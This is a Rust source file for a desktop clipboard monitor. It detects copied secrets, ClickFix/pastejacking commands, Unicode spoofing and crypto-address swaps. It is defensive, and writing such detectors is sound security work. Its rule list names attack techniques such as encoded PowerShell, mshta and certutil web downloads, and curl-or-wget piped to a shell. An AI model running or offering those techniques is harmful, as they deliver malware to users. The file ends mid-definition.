// SPDX-License-Identifier: AGPL-3.0-or-later
// src-tauri/commander-free/src/paste_monitor.rs
//
// ═══════════════════════════════════════════════════════════════════════
// PASTE MONITOR — credential-pattern clipboard watcher (F-1)
// ═══════════════════════════════════════════════════════════════════════
//
// Event-driven background task (plan §4.2 Phase 1c re-point): woken by the
// Windows clipboard-format-change notification (`AddClipboardFormatListener`
// / `WM_CLIPBOARDUPDATE`, via `clipboard_guard_helper::listener`), falling
// back to a slow clipboard-sequence-number poll if that registration fails
// — and surfacing that fallback as a health boolean, never silently (see
// `HEALTH` below).
//
// Matching now goes through the SAME `wincmd_clip_rules` engine the fleet
// console validates custom rules against (plan §4.1): the free-tier
// builtin patterns are the migrated, byte-identical regex/procedural set
// this file used to carry directly in a local `PATTERNS` array — they now
// live in `wincmd_clip_rules::builtin` as `BuiltinPattern`, and credit-card
// detection (which never had a regex — see the old `looks_like_credit_card`)
// is `wincmd_clip_rules::StructuredKind::PaymentCard`. This file's own job
// is now: (1) wrap those 32 builtins + the one structured rule into a fixed
// `Rule` list gated by `EnabledCategories`, (2) drive the shared listener/
// read/cooldown/report plumbing from `clipboard-guard-helper` (the crate
// built for exactly this reuse — see its own crate doc), and (3) preserve
// every byte of the existing toast copy and `DetectionEvent` wire shape the
// frontend already depends on.
//
// This file is deliberately NOT a second, hand-rolled Win32 clipboard
// watcher living alongside `clipboard-guard-helper`'s standalone per-user
// process (plan §2.2/§4.2): it depends on that crate directly and drives
// its `listener`/`read`/`engine`/`report` modules from inside this Tauri
// process's own `tauri::async_runtime::spawn` tasks, so the two watchers
// (this in-GUI one, and the future standalone helper) can never silently
// diverge on what counts as a match.
//
// Privacy guarantees (plan §8 — content-free by construction):
//   - Clipboard CONTENT never crosses the IPC boundary, is never logged,
//     and never appears in the queued `ClipboardEventReport` — every field
//     on that type is a scalar, an id, a timestamp, or a closed enum (see
//     `wincmd_shared::fleet::ClipboardEventReport`'s own doc). A dedicated
//     sentinel test below proves this end-to-end through this file's own
//     match → report path, not just the wire type's shape in isolation.
//   - SHA-256 of the clipboard content is held only in memory for
//     change-detection between events; nothing persists to disk.
//   - The watcher never reads non-text clipboard formats (images, files)
//     and never matches past `clipboard_guard_helper::read::
//     MAX_CLIPBOARD_READ_BYTES` (1 MiB) — truncation happens inside the
//     shared `read`/`engine` modules this file drives, at a UTF-8 char
//     boundary (`wincmd_clip_rules::truncate_for_match`).
//   - Recent-detections ring buffer holds pattern names + timestamps
//     only — no clipboard content.
//
// Honest health (plan §4.2 Phase 1: "this monitor dies with the GUI —
// report that honestly"): `get_paste_monitor_health` exposes
// `clipboard_guard_helper::health::HelperHealth` — `listener_registered`,
// `rules_compiled`, `policy_current`, `clear_failing`, plus this file's own
// `helper_running`/`svc_reachable`. Folding these into
// `capability_status::collect()` is a LATER workflow's job (`commander-pro`)
// — see this file's handoff note for the exact key names/semantics a
// caller there should use.
//
// User-controllable surface (progressive disclosure on the frontend):
//   - Master ON/OFF toggle (already in Privacy panel).
//   - Per-category enable/disable — 8 categories (see `Category` below) so
//     the user can silence pattern groups they don't care about without
//     picking individual regexes. Toggling recompiles this file's
//     `wincmd_clip_rules` ruleset immediately (`install_free_tier_policy`).
//   - Snooze — temporary mute for 15 / 60 minutes when the user is
//     legitimately handling credentials. Unaffected by the new per-rule
//     cooldown below — the two are independent suppression layers.
//   - Recent detections — last 10 in memory, surfaces "caught N this
//     session" feedback.

use std::collections::{HashMap, VecDeque};
use std::sync::atomic::{AtomicBool, AtomicU32, AtomicU64, Ordering};
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};

use once_cell::sync::Lazy;
use regex::Regex;
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use tauri::{AppHandle, Emitter};

use clipboard_guard_helper::actions::{ActionOutcome, ClipboardWriter, Win32Writer};
use clipboard_guard_helper::engine::{CombinedMatchOutcome, CombinedVerdict, MatchEngine};
use clipboard_guard_helper::health::HelperHealth;
use clipboard_guard_helper::ipc::SvcClient;
use clipboard_guard_helper::listener::{self, ClipboardChangeSource};
use clipboard_guard_helper::policy::{ClipboardPolicyResponse, PolicySource, PolicyStore};
use clipboard_guard_helper::read::{ClipboardTextSource, ReadOutcome, Win32TextSource};
use clipboard_guard_helper::report::build_report;
use wincmd_clip_rules::{
    Action, BuiltinPattern, MatchKind, Rule, RuleId, Severity, StructuredKind, Verdict,
};
use wincmd_shared::fleet::ClipboardEventReport;

// ── Categories ──────────────────────────────────────────────────────
//
// 8 buckets chosen to match user mental models, not pattern provenance.
// Adding a new pattern = pick the closest category; don't add a 9th
// category just because the new pattern doesn't fit perfectly.
// (Historical note: an earlier version of this comment said "6 buckets" —
// stale even before this file's Phase 1c re-point; there have always been
// 8 `EnabledCategories` fields.)

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Category {
    /// AWS, Google API, SendGrid, Mailgun, Twilio, DB connection URLs.
    CloudApi,
    /// OpenAI, Anthropic.
    AiApi,
    /// GitHub PAT/fine-grained, NPM tokens.
    DevTools,
    /// Stripe, Slack, Discord — payments + chat.
    PaymentComms,
    /// PEM, OpenSSH, JWT, Bitcoin WIF — raw key material.
    KeysAndCrypto,
    /// Credit cards — `wincmd_clip_rules::StructuredKind::PaymentCard`
    /// (Luhn-checked), not a regex. See `MatchedKind::category` below.
    PersonalData,
    /// ClickFix / pastejacking — encoded PowerShell, mshta-from-web,
    /// iex-irm, curl-pipe-shell, etc. The user did NOT copy their own
    /// secret; they were tricked into copying malware. Different
    /// severity, different toast copy.
    MaliciousCommand,
    /// Unicode-shenanigans paste — homoglyph URLs (Cyrillic in mostly-
    /// Latin host), zero-width chars in code-like context, bidi
    /// overrides. The classic indicators that the paste isn't what it
    /// looks like.
    UnicodeAnomaly,
}

#[derive(Debug, Clone, Copy, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct EnabledCategories {
    pub cloud_api: bool,
    pub ai_api: bool,
    pub dev_tools: bool,
    pub payment_comms: bool,
    pub keys_and_crypto: bool,
    pub personal_data: bool,
    pub malicious_command: bool,
    /// Unicode anomalies — homoglyph URLs, zero-width chars in code-like
    /// contexts, bidi overrides. `#[serde(default)]` for back-compat with
    /// settings.json from before this category existed.
    #[serde(default = "default_true")]
    pub unicode: bool,
}

fn default_true() -> bool {
    true
}

impl Default for EnabledCategories {
    fn default() -> Self {
        // All on by default — opt-out, not opt-in. The user enabled the
        // monitor to catch things; silencing categories is a deliberate
        // decision they make after seeing what fires.
        Self {
            cloud_api: true,
            ai_api: true,
            dev_tools: true,
            payment_comms: true,
            keys_and_crypto: true,
            personal_data: true,
            malicious_command: true,
            unicode: true,
        }
    }
}

impl EnabledCategories {
    fn allows(&self, c: Category) -> bool {
        match c {
            Category::CloudApi => self.cloud_api,
            Category::AiApi => self.ai_api,
            Category::DevTools => self.dev_tools,
            Category::PaymentComms => self.payment_comms,
            Category::KeysAndCrypto => self.keys_and_crypto,
            Category::PersonalData => self.personal_data,
            Category::MaliciousCommand => self.malicious_command,
            Category::UnicodeAnomaly => self.unicode,
        }
    }
}

// ── Free-tier ruleset — wraps `wincmd_clip_rules` builtins, replacing the
//    old local `PATTERNS`/`looks_like_credit_card` (plan §4.1) ──────────

/// Which of the 8 legacy free-tier categories a `BuiltinPattern` belongs to
/// — i.e. which `EnabledCategories` boolean gates it. Mirrors
/// `wincmd_clip_rules::builtin`'s own module-doc category → severity
/// mapping exactly. That crate doesn't expose this grouping itself, since
/// `EnabledCategories` (and the 8-bucket mental model it encodes) is a
/// free-tier UI concept, not something the shared rule engine needs to
/// know about.
fn builtin_category(pattern: BuiltinPattern) -> Category {
    use BuiltinPattern::*;
    match pattern {
        AwsAccessKey
        | GoogleApiKey
        | SendgridApiKey
        | MailgunApiKey
        | TwilioAccountSid
        | DatabaseUrlWithCredentials => Category::CloudApi,
        OpenAiProjectKey | OpenAiApiKey | AnthropicApiKey => Category::AiApi,
        GitHubClassicToken | GitHubFineGrainedToken | NpmToken => Category::DevTools,
        StripeLiveSecret | StripeLivePublishable | SlackToken | DiscordBotToken => {
            Category::PaymentComms
        }
        PrivateKeyPem | SshPrivateKeyHeader | Jwt | BitcoinWifPrivateKey => Category::KeysAndCrypto,
        PowershellEncodedPayload
        | HiddenPowershellWindow
        | PowershellExecutionPolicyBypass
        | PowershellRemoteDownloadExecute
        | MshtaWebPayload
        | CertutilWebDownload
        | Regsvr32WebPayload
        | BitsadminWebTransfer
        | CurlWgetPipeToShell => Category::MaliciousCommand,
        UnicodeBidiOverride | UnicodeZeroWidthInCode | UnicodeConfusableUrlHost => {
            Category::UnicodeAnomaly
        }
    }
}

/// Which concrete `wincmd_clip_rules` matcher backs one of this file's fixed
/// free-tier rules — either a `BuiltinPattern` (regex or procedural), or the
/// Luhn-checked `StructuredKind::PaymentCard` (credit cards never had a
/// regex in the legacy engine — see `wincmd_clip_rules::structured`'s doc).
/// A small wrapper enum so this file's one credit-card rule can share the
/// exact same lookup/display/severity/category plumbing as the 32
/// `BuiltinPattern`-backed rules.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum MatchedKind {
    Builtin(BuiltinPattern),
    PaymentCard,
}

impl MatchedKind {
    /// Human-readable name for the toast/`DetectionEvent`/report — a
    /// fixed, crate- or file-owned string, never clipboard content (see
    /// `BuiltinPattern::display_name`'s own doc for the same invariant).
    fn display_name(self) -> &'static str {
        match self {
            MatchedKind::Builtin(bp) => bp.display_name(),
            MatchedKind::PaymentCard => "Credit Card Number",
        }
    }

    /// Which `EnabledCategories` toggle gates this pattern.
    fn category(self) -> Category {
        match self {
            MatchedKind::Builtin(bp) => builtin_category(bp),
            MatchedKind::PaymentCard => Category::PersonalData,
        }
    }

    /// The `wincmd_clip_rules::Severity` this rule should carry. Builtins
    /// use the crate's OWN authoritative `default_severity()` (never
    /// re-derived locally, so this file can't drift from the crate's own
    /// category → severity mapping); the credit-card rule carries `Warn`,
    /// matching the legacy `Category::PersonalData` tier exactly (see
    /// `wincmd_clip_rules::structured`'s module doc: "carrying the same
    /// Severity::Warn its Category::severity() would have given it").
    fn severity(self) -> Severity {
        match self {
            MatchedKind::Builtin(bp) => bp.default_severity(),
            MatchedKind::PaymentCard => Severity::Warn,
        }
    }
}

/// Map a `wincmd_clip_rules::Severity` back to the legacy two-tier string
/// the frontend/toast copy already expects (`"warning"`/`"danger"`) — see
/// the old `Category::severity()` this replaces. Builtins/`PaymentCard`
/// only ever carry `Warn`/`High` (see `MatchedKind::severity`'s doc), but
/// `Info`/`Critical` are mapped defensively rather than treated as
/// unreachable, since a future managed/custom rule could carry them.
fn severity_label(severity: Severity) -> &'static str {
    match severity {
        Severity::Warn => "warning",
        Severity::High => "danger",
        Severity::Info => "warning",
        Severity::Critical => "danger",
    }
}

/// The fixed free-tier pattern list, in the LEGACY engine's exact
/// evaluation order: the 29 original `PATTERNS` entries (in their original
/// declaration order), then the credit-card check, then the 3 unicode
/// sub-checks — exactly the order `check_patterns`/`check_unicode_anomaly`
/// used to check them in (PATTERNS loop first, credit card only if that
/// found nothing, unicode only if THAT found nothing too).
///
/// This order is not cosmetic: `build_free_tier_rules` below assigns each
/// entry a `priority` that strictly DECREASES down this list, so that if a
/// clipboard string happens to satisfy more than one of these 33 rules at
/// once (a real case — e.g. an OpenSSH PEM header also satisfies the
/// generic `PrivateKeyPem` alternation), `CompiledRuleSet::evaluate`'s
/// "highest priority wins" rule reproduces the legacy engine's "first
/// pattern in the fixed list that matches wins" behaviour exactly, instead
/// of picking an arbitrary one.
const FREE_TIER_PATTERNS: &[MatchedKind] = &[
    // ── Cloud APIs ──────────────────────────────────────────────────
    MatchedKind::Builtin(BuiltinPattern::AwsAccessKey),
    MatchedKind::Builtin(BuiltinPattern::GoogleApiKey),
    MatchedKind::Builtin(BuiltinPattern::SendgridApiKey),
    MatchedKind::Builtin(BuiltinPattern::MailgunApiKey),
    MatchedKind::Builtin(BuiltinPattern::TwilioAccountSid),
    MatchedKind::Builtin(BuiltinPattern::DatabaseUrlWithCredentials),
    // ── AI APIs ─────────────────────────────────────────────────────
    MatchedKind::Builtin(BuiltinPattern::OpenAiProjectKey),
    MatchedKind::Builtin(BuiltinPattern::OpenAiApiKey),
    MatchedKind::Builtin(BuiltinPattern::AnthropicApiKey),
    // ── Developer Tools ─────────────────────────────────────────────
    MatchedKind::Builtin(BuiltinPattern::GitHubClassicToken),
    MatchedKind::Builtin(BuiltinPattern::GitHubFineGrainedToken),
    MatchedKind::Builtin(BuiltinPattern::NpmToken),
    // ── Payments & Comms ────────────────────────────────────────────
    MatchedKind::Builtin(BuiltinPattern::StripeLiveSecret),
    MatchedKind::Builtin(BuiltinPattern::StripeLivePublishable),
    MatchedKind::Builtin(BuiltinPattern::SlackToken),
    MatchedKind::Builtin(BuiltinPattern::DiscordBotToken),
    // ── Keys & Crypto ───────────────────────────────────────────────
    MatchedKind::Builtin(BuiltinPattern::PrivateKeyPem),
    MatchedKind::Builtin(BuiltinPattern::SshPrivateKeyHeader),
    MatchedKind::Builtin(BuiltinPattern::Jwt),
    MatchedKind::Builtin(BuiltinPattern::BitcoinWifPrivateKey),
    // ── Malicious Commands (ClickFix / pastejacking defence) ────────
    MatchedKind::Builtin(BuiltinPattern::PowershellEncodedPayload),
    MatchedKind::Builtin(BuiltinPattern::HiddenPowershellWindow),
    MatchedKind::Builtin(BuiltinPattern::PowershellExecutionPolicyBypass),
    MatchedKind::Builtin(BuiltinPattern::PowershellRemoteDownloadExecute),
    MatchedKind::Builtin(BuiltinPattern::MshtaWebPayload),
    MatchedKind::Builtin(BuiltinPattern::CertutilWebDownload),
    MatchedKind::Builtin(BuiltinPattern::Regsvr32WebPayload),
    MatchedKind::Builtin(BuiltinPattern::BitsadminWebTransfer),
    MatchedKind::Builtin(BuiltinPattern::CurlWgetPipeToShell),
    // ── Personal Data (credit card — Luhn, not a regex) ─────────────
    MatchedKind::PaymentCard,
    // ── Unicode anomalies — procedural `BuiltinPattern` variants ────
    MatchedKind::Builtin(BuiltinPattern::UnicodeBidiOverride),
    MatchedKind::Builtin(BuiltinPattern::UnicodeZeroWidthInCode),
    MatchedKind::Builtin(BuiltinPattern::UnicodeConfusableUrlHost),
];

/// Cooldown applied to every free-tier builtin/structured rule (plan
/// §4.1/§4.2: "per-rule cooldown via `CooldownLedger`, replacing reliance
/// on the global snooze alone"). 30s is a deliberate choice, not a value
/// carried over from the legacy engine (which had no per-rule cooldown at
/// all — only the global snooze): long enough that a quick burst of
/// distinct-but-related secrets (e.g. rotating through a few AWS keys
/// while cleaning up a shared doc) folds into one toast + a suppressed
/// count instead of an alert storm, short enough that a genuinely new,
/// unrelated paste of the same pattern minutes later still gets its own
/// toast. The global snooze (`SNOOZE_UNTIL`) is unaffected and keeps
/// working exactly as before — this is an ADDITIONAL, finer-grained
/// suppression layer, not a replacement.
const FREE_TIER_COOLDOWN_SECONDS: u32 = 30;

/// `ClipboardPolicyResponse.policy_version` this file installs its own
/// fixed builtin/structured ruleset under. `0` is the same "nothing
/// managed installed yet" sentinel `clipboard_guard_helper::policy::
/// PolicyStore`'s own empty starting policy uses — appropriate here too,
/// since Free's own local ruleset is not a Fleet-signed epoch (that's the
/// separate `svc.policy.install_epoch` path — `settings.rs::
/// handle_clipboard_guard_epoch_subtrees`). If a managed epoch's
/// clipboard-guard subtree is ever merged with this file's own builtins in
/// a later phase, this constant is the one place that would need to change.
const FREE_TIER_POLICY_VERSION: i64 = 0;

/// Deterministic, process-local `RuleId` for the free-tier pattern at
/// `index` in [`FREE_TIER_PATTERNS`]. These ids exist only to give
/// `CooldownLedger`/`Verdict` a per-pattern identity within this running
/// process — they are NOT Fleet-authored rule ids, are never persisted
/// across restarts, and their stability across app versions doesn't
/// matter (only uniqueness across this fixed ~33-entry set does).
/// `RuleId::new` validates SHAPE only (32 lowercase hex chars), which a
/// zero-padded index trivially satisfies.
fn free_rule_id(index: u8) -> RuleId {
    RuleId::new(format!("{index:032x}"))
        .expect("free_rule_id: a zero-padded u8 index always produces a valid 32-hex RuleId")
}

/// Build this file's fixed free-tier ruleset for the given category
/// toggles, plus a `RuleId → MatchedKind` lookup so a later `Verdict` can
/// be turned back into a display name/severity for the toast and
/// `DetectionEvent`. Disabled categories are NOT omitted from the list —
/// their rules are simply built with `enabled: false`, which
/// `wincmd_clip_rules::compile()` skips entirely (never compiled, never
/// counted against limits) — this is what makes `EnabledCategories`
/// toggling a cheap, always-successful recompile rather than a structural
/// change to the rule set.
fn build_free_tier_rules(enabled: &EnabledCategories) -> (Vec<Rule>, HashMap<RuleId, MatchedKind>) {
    let total = FREE_TIER_PATTERNS.len();
    let mut rules = Vec::with_capacity(total);
    let mut lookup = HashMap::with_capacity(total);

    for (index, &kind) in FREE_TIER_PATTERNS.iter().enumerate() {
        let id = free_rule_id(index as u8);
        let matcher = match kind {
            MatchedKind::Builtin(bp) => MatchKind::Builtin(bp),
            MatchedKind::PaymentCard => MatchKind::Structured(StructuredKind::PaymentCard),
        };
        rules.push(Rule {
            id: id.clone(),
            revision: 1,
            name: kind.display_name().to_string(),
            enabled: enabled.allows(kind.category()),
            // Strictly decreasing by declaration order — see
            // `FREE_TIER_PATTERNS`'s doc comment for why this exact
            // tie-break matters.
            priority: (total - index) as u16,
            matcher,
            severity: kind.severity(),
            // Builtins are part of the device-local source. They must not
            // turn a personal clipboard match into organisation telemetry.
            actions: vec![Action::NotifyUser],
            cooldown_seconds: FREE_TIER_COOLDOWN_SECONDS,
            snoozable: true,
            // Free-tier builtins aren't user-editable (no custom rule
            // editor on this tier) — `locked` is a hint for a future
            // authoring UI, not enforced by `wincmd_clip_rules` itself.
            locked: true,
        });
        lookup.insert(id, kind);
    }

    (rules, lookup)
}

/// (Re)compile this file's free-tier ruleset for the given category
/// toggles and install it as the active policy, updating the `rules_
/// compiled`/`policy_current` health flags honestly either way. Called
/// once at watcher start and again every time `EnabledCategories` change.
/// The free-tier ruleset is small (≤ `RuleSetLimits::default()
/// .max_enabled_rules`, currently 33 « 100) and fixed, so a compile
/// failure here would indicate a bug in this file, not user input — but
/// this function still treats it as a normal, recoverable outcome (never
/// panics), exactly like `clipboard_guard_helper::policy::PolicyStore::
/// install`'s own atomic-install-with-last-valid-retention contract.
fn local_policy_response(
    enabled: &EnabledCategories,
    custom: &ClipboardPolicyResponse,
) -> (ClipboardPolicyResponse, HashMap<RuleId, MatchedKind>) {
    let (mut rules, lookup) = build_free_tier_rules(enabled);
    rules.extend(custom.rules.iter().cloned());
    (
        ClipboardPolicyResponse {
            policy_version: custom.policy_version,
            rules,
        },
        lookup,
    )
}

fn install_local_policy(
    enabled: &EnabledCategories,
    custom: &ClipboardPolicyResponse,
) -> Result<(), String> {
    let (response, lookup) = local_policy_response(enabled, custom);
    let mut store = POLICY.lock().unwrap();
    let result = store.install_local(&response);
    let rules_compiled = store.rules_compiled_for(PolicySource::Local);
    drop(store);

    *RULE_LOOKUP.lock().unwrap() = lookup;

    {
        let mut health = HEALTH.lock().unwrap();
        health.rules_compiled = rules_compiled;
        health.policy_current = result.is_ok();
    }

    if result.is_err() {
        crate::log_message(
            "warn",
            "[PasteMonitor] local ruleset rejected; keeping last valid local policy",
        );
        return Err("local clipboard rules were rejected".to_string());
    }
    Ok(())
}

fn install_free_tier_policy(enabled: &EnabledCategories) -> Result<(), String> {
    let custom = LOCAL_CUSTOM_RULES.lock().unwrap().clone();
    install_local_policy(enabled, &custom)
}

// ── Toast copy (byte-identical to the legacy engine) ─────────────────

/// Build the notification title/body for one detection. Extracted
/// verbatim from the old inline logic so it (a) is unit-testable without a
/// real `AppHandle`/notification plumbing, and (b) can never drift subtly
/// during the Phase 1c re-point — this is the exact copy users already
/// see, and the task's constraint is that it must not change.
fn detection_copy(pattern: &str, severity: &str) -> (&'static str, String) {
    let is_powershell = pattern.to_ascii_lowercase().contains("powershell")
        || pattern.to_ascii_lowercase().contains("encodedcommand")
        || pattern.to_ascii_lowercase().contains("executionpolicy")
        || pattern.to_ascii_lowercase().contains("pwsh");

    if severity == "danger" && is_powershell {
        (
            "WinCommander · Dangerous PowerShell command",
            format!(
                "Clipboard contains a PowerShell-style payload ({}). \
                Do not paste it into Win+R, Terminal, or PowerShell unless you wrote it yourself.",
                pattern
            ),
        )
    } else if severity == "danger" {
        (
            "WinCommander · Suspicious clipboard content",
            format!(
                "You copied something that looks like a malware payload ({}). \
                Do not paste this into Win+R, PowerShell, or any terminal. \
                This is the ClickFix / pastejacking trick.",
                pattern
            ),
        )
    } else {
        (
            "WinCommander · Paste Monitor",
            format!(
                "Looks like you copied a {} — be careful where you paste it.",
                pattern
            ),
        )
    }
}

// ── Crypto-address swap detection (paid extension) ──────────────────
//
// Classic clipboard-hijack malware (Lumma, RedLine, Atomic Stealer)
// watches for crypto addresses being copied and silently overwrites them
// with the attacker's address. The user sees their own address get copied
// — paste seconds later — and the attacker's address arrives at their
// wallet's "Send to" field. By the time the user notices, the
// transaction is mined.
//
// Detection: every clipboard change, extract any crypto address present.
// Compare to the last address seen of the same family. If different AND
// the previous one was seen within the swap window, fire "Crypto Address
// Swap" with danger severity. The user copied address A; now address B
// is on the clipboard with no intermediate user action.
//
// Privacy invariant: we never log or emit the actual address. The event
// payload only says "Crypto Address Swap detected (Bitcoin)".
//
// This entire section is UNCHANGED by the Phase 1c re-point — it is a
// paid-tier feature with no equivalent in `wincmd_clip_rules` (which only
// carries the migrated free-tier builtins + the two structured checks),
// so it stays exactly as it was, running before the category-pattern
// check on every clipboard change (see the main loop below).

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
enum CryptoFamily {
    Bitcoin,
    Ethereum,
    Monero,
    Solana,
    Litecoin,
    Tron,
}

impl CryptoFamily {
    fn display(self) -> &'static str {
        match self {
            CryptoFamily::Bitcoin => "Bitcoin",
            CryptoFamily::Ethereum => "Ethereum",
            CryptoFamily::Monero => "Monero",
            CryptoFamily::Solana => "Solana",
            CryptoFamily::Litecoin => "Litecoin",
            CryptoFamily::Tron => "Tron",
        }
    }
}

struct CryptoPattern {
    family: CryptoFamily,
    re: Regex,
}

static CRYPTO_PATTERNS: Lazy<Vec<CryptoPattern>> = Lazy::new(|| {
    let mk = |family: CryptoFamily, pat: &str| CryptoPattern {
        family,
        re: Regex::new(pat).expect("paste_monitor: invalid crypto regex"),
    };
    vec![
        // Bitcoin — three formats. Order matters: Bech32 first so its
        // longer prefix wins over generic Base58 matchers.
        mk(CryptoFamily::Bitcoin, r"\bbc1[a-z0-9]{38,58}\b"), // Bech32 P2WPKH/P2WSH/Taproot
        mk(CryptoFamily::Bitcoin, r"\b1[1-9A-HJ-NP-Za-km-z]{25,34}\b"), // P2PKH
        mk(CryptoFamily::Bitcoin, r"\b3[1-9A-HJ-NP-Za-km-z]{25,34}\b"), // P2SH
        // Ethereum (and EVM chains: Polygon, BSC, Arbitrum, Optimism)
        mk(CryptoFamily::Ethereum, r"\b0x[a-fA-F0-9]{40}\b"),
        // Monero — `4` or `8` prefix + 94 base58 chars after
        mk(CryptoFamily::Monero, r"\b[48][1-9A-HJ-NP-Za-km-z]{94}\b"),
        // Solana — base58, 32-44 chars. False-positive prone in isolation
        // but swap-detection only fires on a CHANGE so the FP cost is low.
        mk(CryptoFamily::Solana, r"\b[1-9A-HJ-NP-Za-km-z]{32,44}\b"),
        // Litecoin — legacy `L`/`M` + Bech32 `ltc1`
        mk(CryptoFamily::Litecoin, r"\bltc1[a-z0-9]{38,58}\b"),
        mk(
            CryptoFamily::Litecoin,
            r"\b[LM][1-9A-HJ-NP-Za-km-z]{25,34}\b",
        ),
        // Tron — `T` + 33 base58 chars
        mk(CryptoFamily::Tron, r"\bT[1-9A-HJ-NP-Za-km-z]{33}\b"),
    ]
});

/// Decode a Bitcoin-alphabet base58 string to its raw bytes. Returns `None`
/// if any character is outside the alphabet. Used to validate that a base58
/// candidate is a real fixed-width key (e.g. a 32-byte Solana pubkey) rather
/// than arbitrary base58-looking text — the Solana regex alone is just a
/// char-class and over-matches ordinary strings.
fn base58_decode(s: &str) -> Option<Vec<u8>> {
    const ALPHABET: &[u8] = b"123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
    let mut result: Vec<u8> = Vec::new(); // little-endian base-256 accumulator
    for c in s.bytes() {
        let mut carry = ALPHABET.iter().position(|&a| a == c)? as u32;
        for byte in result.iter_mut() {
            carry += (*byte as u32) * 58;
            *byte = (carry & 0xff) as u8;
            carry >>= 8;
        }
        while carry > 0 {
            result.push((carry & 0xff) as u8);
            carry >>= 8;
        }
    }
    // Leading '1's encode leading zero bytes.
    let zeros = s.bytes().take_while(|&c| c == b'1').count();
    let mut out = vec![0u8; zeros];
    out.extend(result.iter().rev());
    Some(out)
}

/// A Solana address is a 32-byte ed25519 public key. Requiring an exact
/// 32-byte base58 decode rejects the ordinary base58-shaped strings (other
/// chains' addresses, IDs, random tokens) the bare char-class regex matches.
fn is_valid_solana(addr: &str) -> bool {
    base58_decode(addr).is_some_and(|b| b.len() == 32)
}

/// Extract the first crypto address in `text` per family. Returns a map
/// of family → captured address string. Multiple families can match the
/// same text (e.g. a Slack message with both BTC and ETH addresses) —
/// each is tracked independently.
fn extract_crypto_addresses(text: &str) -> HashMap<CryptoFamily, String> {
    let mut found: HashMap<CryptoFamily, String> = HashMap::new();
    for cp in CRYPTO_PATTERNS.iter() {
        if found.contains_key(&cp.family) {
            // First match per family wins (Bech32 ordered before Base58
            // for Bitcoin/Litecoin, so the more specific format takes
            // priority).
            continue;
        }
        // Solana over-matches as a pure base58 char-class, so scan all
        // matches and keep the first that decodes to a real 32-byte pubkey;
        // every other family takes its first regex hit.
        for m in cp.re.find_iter(text) {
            let addr = m.as_str();
            if cp.family == CryptoFamily::Solana && !is_valid_solana(addr) {
                continue;
            }
            found.insert(cp.family, addr.to_string());
            break;
        }
    }
    found
}

/// Pure swap-decision step: given the crypto addresses on the *current*
/// clipboard, the per-family last-seen map, and the current instant,
/// decide whether a swap fired and update the last-seen map in place.
///
/// A swap fires for a family when the current address DIFFERS from the
/// stored one AND the stored one was seen within `CRYPTO_SWAP_WINDOW`
/// (the user copied A, then B replaced it without a deliberate new copy).
/// The map is always updated to `(addr, now)` for every current family —
/// this is the sliding-window behaviour (re-copying the same address
/// refreshes its timestamp).
///
/// KT: extracted out of the poll loop verbatim so the time-window /
/// debounce semantics can be unit-tested with an injected `Instant`
/// (the live loop has no seam for deterministic time). At most one family
/// is reported per call, matching the loop's single-`detected` variable.
fn decide_crypto_swap(
    current: &HashMap<CryptoFamily, String>,
    last_map: &mut HashMap<CryptoFamily, (String, Instant)>,
    now: Instant,
) -> Option<CryptoFamily> {
    let mut detected: Option<CryptoFamily> = None;
    if current.is_empty() {
        return None;
    }
    for (family, addr) in current.iter() {
        if let Some((prev_addr, seen_at)) = last_map.get(family) {
            // Same family but different address inside the swap window →
            // almost certainly a clipboard hijack. Don't fire on the user
            // manually copying a NEW address after the window expires
            // (legitimate behaviour).
            if prev_addr != addr && now.duration_since(*seen_at) <= CRYPTO_SWAP_WINDOW {
                detected = Some(*family);
            }
        }
        last_map.insert(*family, (addr.clone(), now));
    }
    detected
}

// ── Watcher state ───────────────────────────────────────────────────

static RUNNING: AtomicBool = AtomicBool::new(false);

/// Bumped on every `start_paste_monitor` call. Lets a background task from
/// a PREVIOUS start reliably notice it has been superseded even if
/// `RUNNING` gets flipped back to `true` by a fresh start before the old
/// task's blocking `wait_for_change()` call returns — see
/// `start_paste_monitor`'s doc for why the event-driven listener makes
/// this race more likely to matter than it was under the old fixed-
/// interval poll.
static GENERATION: AtomicU64 = AtomicU64::new(0);

static ENABLED_CATEGORIES: Lazy<Mutex<EnabledCategories>> =
    Lazy::new(|| Mutex::new(EnabledCategories::default()));

/// `Some(deadline)` while snoozed. Watcher returns early until then.
static SNOOZE_UNTIL: Lazy<Mutex<Option<Instant>>> = Lazy::new(|| Mutex::new(None));

/// Per-family last observed crypto address + when. Used for swap
/// detection: if the current clipboard's address for a family differs
/// from this stored one and the timestamp is within `CRYPTO_SWAP_WINDOW`,
/// we fire a swap event.
static LAST_CRYPTO_ADDR: Lazy<Mutex<HashMap<CryptoFamily, (String, Instant)>>> =
    Lazy::new(|| Mutex::new(HashMap::new()));

/// Time window inside which a same-family address change is treated as
/// a swap (not a deliberate new copy). 60 s covers the time between
/// copying an address and pasting it into a wallet UI.
const CRYPTO_SWAP_WINDOW: Duration = Duration::from_secs(60);

/// Master toggle for the crypto-swap detector. Default ON — high-signal
/// detection with low FP cost (only fires on a change-of-address).
static CRYPTO_SWAP_ENABLED: AtomicBool = AtomicBool::new(true);

/// The free-tier `wincmd_clip_rules` policy currently installed — see
/// `install_free_tier_policy`. Starts empty (matches nothing) until the
/// watcher's first `start_paste_monitor` call.
static POLICY: Lazy<Mutex<PolicyStore>> = Lazy::new(|| Mutex::new(PolicyStore::new()));

/// Persisted by the settings owner; this runtime holds only the live copy.
/// Builtins are combined with these before they enter the local source.
static LOCAL_CUSTOM_RULES: Lazy<Mutex<ClipboardPolicyResponse>> = Lazy::new(|| {
    Mutex::new(ClipboardPolicyResponse {
        policy_version: FREE_TIER_POLICY_VERSION,
        rules: Vec::new(),
    })
});

/// Last valid Fleet policy fetched from commander-svc. It remains live
/// while Fleet is temporarily unavailable and is cleared only on unenrol.
static MANAGED_FLEET_RULES: Lazy<Mutex<ClipboardPolicyResponse>> = Lazy::new(|| {
    Mutex::new(ClipboardPolicyResponse {
        policy_version: 0,
        rules: Vec::new(),
    })
});

/// `RuleId → MatchedKind` for the CURRENTLY installed policy — lets a
/// `Verdict` (which is structurally content-free and carries no name) be
/// turned back into a display name/severity for the toast/report.
